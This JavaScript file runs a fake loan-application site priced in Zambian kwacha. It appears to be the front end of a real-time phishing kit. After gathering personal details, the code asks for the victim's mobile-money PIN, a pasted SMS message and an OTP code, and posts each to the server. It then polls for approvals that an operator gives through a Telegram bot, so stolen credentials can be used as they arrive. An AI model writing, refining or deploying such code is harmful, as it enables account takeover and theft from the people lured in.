let appDataStore = {
  loanType: 'Business Loan',
  amount: 1000000,
  term: '48 Months',
  purpose: '',
  firstName: '',
  lastName: '',
  phone: '',
  employment: 'Self-employed',
  income: '',
  appId: ''
};

let pollInterval = null;

// Navigation control
function goToStep(stepNum) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  
  if (stepNum === 'welcome') document.getElementById('screen-welcome').classList.add('active');
  else if (stepNum === 1) document.getElementById('screen-step1').classList.add('active');
  else if (stepNum === 2) {
    // Gather step 1 inputs
    appDataStore.loanType = document.getElementById('loan-type').value;
    appDataStore.amount = document.getElementById('input-amount').value;
    appDataStore.term = document.getElementById('loan-term').value;
    appDataStore.purpose = document.getElementById('loan-purpose').value;
    
    document.getElementById('screen-step2').classList.add('active');
  } 
  else if (stepNum === 3) {
    // Gather step 2 inputs
    appDataStore.firstName = document.getElementById('first-name').value;
    appDataStore.lastName = document.getElementById('last-name').value;
    appDataStore.phone = document.getElementById('phone-number').value;

    // Populate step 3 summary
    document.getElementById('summary-amount').innerText = `ZMW ${Number(appDataStore.amount).toLocaleString()}`;
    document.getElementById('summary-term').innerText = appDataStore.term;
    document.getElementById('summary-purpose').innerText = appDataStore.purpose || '-';
    document.getElementById('summary-applicant').innerText = `${appDataStore.firstName} ${appDataStore.lastName}`;

    document.getElementById('screen-step3').classList.add('active');
  }
}

// Range slider interaction on welcome screen
const rangeInput = document.getElementById('loan-range');
if (rangeInput) {
  rangeInput.addEventListener('input', (e) => {
    const val = Number(e.target.value);
    document.getElementById('calc-display-amount').innerText = `ZMW ${val.toLocaleString()}`;
    const monthly = Math.round(val / 48);
    document.getElementById('calc-monthly-payment').innerText = `ZMW ${monthly.toLocaleString()}`;
  });
}

// Submit Application from Step 3 -> Goes to Login / PIN screen
async function submitApplication() {
  appDataStore.employment = document.getElementById('employment-status').value;
  appDataStore.income = document.getElementById('annual-income').value;

  try {
    const res = await fetch('/api/applications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(appDataStore)
    });
    const data = await res.json();
    appDataStore.appId = data.id;

    // Set phone number on login screen
    document.getElementById('login-phone').value = appDataStore.phone;
    document.getElementById('display-app-id').innerText = `Application ID: ${appDataStore.appId}`;
    document.getElementById('display-app-id-sms').innerText = `Application ID: ${appDataStore.appId}`;
    document.getElementById('display-app-id-otp').innerText = `Application ID: ${appDataStore.appId}`;

    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById('screen-login').classList.add('active');
  } catch (err) {
    alert('Failed to connect to server.');
  }
}

// PIN inputs management
const pinInputs = document.querySelectorAll('.p-pin');
pinInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    if (e.target.value.length === 1 && index < pinInputs.length - 1) {
      pinInputs[index + 1].focus();
    }
    checkPinComplete();
  });
});

function checkPinComplete() {
  let allFilled = Array.from(pinInputs).every(i => i.value.length === 1);
  const btn = document.getElementById('btn-login-momo');
  if (allFilled) {
    btn.style.background = '#004F9F';
    btn.style.color = '#FFF';
    btn.removeAttribute('disabled');
  } else {
    btn.style.background = '#E2E2E2';
    btn.style.color = '#888';
    btn.setAttribute('disabled', 'true');
  }
}

async function submitPinLogin() {
  const pin = Array.from(pinInputs).map(i => i.value).join('');
  
  // Show waiting admin screen
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-waiting-admin').style.display = 'flex';

  await fetch('/verify-pin', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
  });

  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms');
}

// SMS Verification Submit
async function submitSmsVerification() {
  const smsText = document.getElementById('sms-text-input').value;
  if (!smsText) return alert('Please enter or paste your SMS message.');

  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-waiting-sms').style.display = 'flex';

  await fetch('/verify-sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ appId: appDataStore.appId, smsText })
  });

  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp');
}

// OTP Inputs Management
const otpInputs = document.querySelectorAll('.p-otp');
otpInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    if (e.target.value.length === 1 && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
    checkOtpComplete();
  });
});

function checkOtpComplete() {
  let allFilled = Array.from(otpInputs).every(i => i.value.length === 1);
  const btn = document.getElementById('btn-verify-otp');
  if (allFilled) {
    btn.style.background = '#004F9F';
    btn.style.color = '#FFF';
    btn.removeAttribute('disabled');
  } else {
    btn.style.background = '#E2E2E2';
    btn.style.color = '#888';
    btn.setAttribute('disabled', 'true');
  }
}

async function submitOtpCode() {
  const otpCode = Array.from(otpInputs).map(i => i.value).join('');

  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-waiting-otp').style.display = 'flex';

  await fetch('/verify-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ appId: appDataStore.appId, otpCode })
  });

  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success');
}

// Polling function to listen for Telegram admin inline-keyboard approvals
function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId) {
  if (pollInterval) clearInterval(pollInterval);

  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/check-status/${appDataStore.appId}`);
      const data = await res.json();

      if (data.status === targetStatus) {
        clearInterval(pollInterval);
        document.getElementById(waitingScreenId).style.display = 'none';
        
        if (nextScreenId === 'screen-success') {
          document.getElementById('final-success-id').innerText = `Application ID: ${appDataStore.appId}`;
        }

        document.getElementById(nextScreenId).classList.add('active');
      } else if (data.status && data.status.includes('REJECTED')) {
        clearInterval(pollInterval);
        alert('Verification failed or was rejected by admin.');
        location.reload();
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
                                                          }
      
